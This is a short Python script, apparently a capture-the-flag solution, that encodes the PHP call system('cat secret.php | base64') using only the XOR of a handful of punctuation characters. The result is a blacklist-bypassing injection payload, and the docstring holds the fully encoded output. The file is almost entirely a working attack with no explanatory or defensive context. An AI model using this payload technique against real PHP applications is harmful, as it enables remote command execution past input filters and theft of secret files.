alphabet = "\".^()';"
n = len(alphabet)

D = {}
for bit in range(1 << n):
    S = [alphabet[i] for i in range(n) if bit >> i & 1]
    xor = 0
    for s in S:
        xor ^= ord(s)
    D[chr(xor)] = S


print(D)
print(sorted(D))
print(len(D))


def escape_quote(s):
    if s == "'":
        return f'"{s}"'
    else:
        return f"'{s}'"


def convert(S):
    ans = []
    for s in S:
        assert s in D
        ans.append("^".join(map(escape_quote, D[s])))
    return ".".join(map(lambda t: f"({t})", ans))


# ans = []
# # target = "'; ('system')('cat secret.php | base64');'"
# target = "cat secret.php | base64"
# for t in target:
#     assert t in D
#     print(t, D[t])
#     ans.append(" ^ ".join(map(escape_quote, D[t])))

system = convert("system")
cat = convert("cat secret.php | base64")

print(f"({system})({cat})")
# print(f"'; ({system})({cat});'")

"""
system
('"' ^ '^' ^ '(' ^ "'") . ('^' ^ "'") . ('"' ^ '^' ^ '(' ^ "'") . ('"' ^ '.' ^ '^' ^ '(' ^ ')' ^ "'") . ('^' ^ ';') . ('.' ^ '^' ^ '(' ^ ')' ^ "'" ^ ';')
---
cat secret.php | base64
('.' ^ '^' ^ '(' ^ ';') . ('"' ^ '^' ^ '(' ^ ')' ^ "'" ^ ';') . ('"' ^ '.' ^ '^' ^ '(' ^ ')' ^ "'") . ('.' ^ ')' ^ "'") . ('"' ^ '^' ^ '(' ^ "'") . ('^' ^ ';') . ('.' ^ '^' ^ '(' ^ ';') . ('"' ^ '^' ^ ')' ^ "'") . ('^' ^ ';') . ('"' ^ '.' ^ '^' ^ '(' ^ ')' ^ "'") . ('.') . ('.' ^ '^') . ('"' ^ '.' ^ '^' ^ '(' ^ ')' ^ ';') . ('.' ^ '^') . ('.' ^ ')' ^ "'") . ('"' ^ '^') . ('.' ^ ')' ^ "'") . ('.' ^ '^' ^ ')' ^ ';') . ('"' ^ '^' ^ '(' ^ ')' ^ "'" ^ ';') . ('"' ^ '^' ^ '(' ^ "'") . ('^' ^ ';') . ('"' ^ '.' ^ '(' ^ ')' ^ ';') . ('(' ^ "'" ^ ';')
"""
